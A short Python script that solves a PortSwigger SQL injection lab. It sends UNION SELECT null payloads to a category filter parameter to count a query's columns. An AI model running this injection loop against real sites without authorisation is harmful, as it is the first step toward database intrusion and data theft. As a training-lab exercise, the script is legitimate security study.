from bs4 import BeautifulSoup
import requests
from sys import argv

# This is a simple union injection to determine the number of columns
# https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

def column_enumeration(url):
    url = url + "/filter?category=" 
    # A more easier payload to use is 'order by 1-- 
    no_columns = 1
    payload = "null"
    while (True):
        query_value = f"'UNION select {payload}--"
        response = requests.get(url+query_value)
        print(url+query_value)
        response = BeautifulSoup(response.text,'html.parser')
        if "Internal Server Error" not in response.text:
            return "[+] UNION Injection successful the number of columns is " + str(no_columns)
        else:
            payload = payload + ",null"
            no_columns = no_columns + 1
    return "[-] Unsuccessful UNION Injection"

if __name__ == "__main__":
    try:
        url = argv[1]
        result = column_enumeration(url)
        print(result)
    except Exception as e:
        print(f'[-] Usage: python3 {argv[0]} <url>')
        print(e)
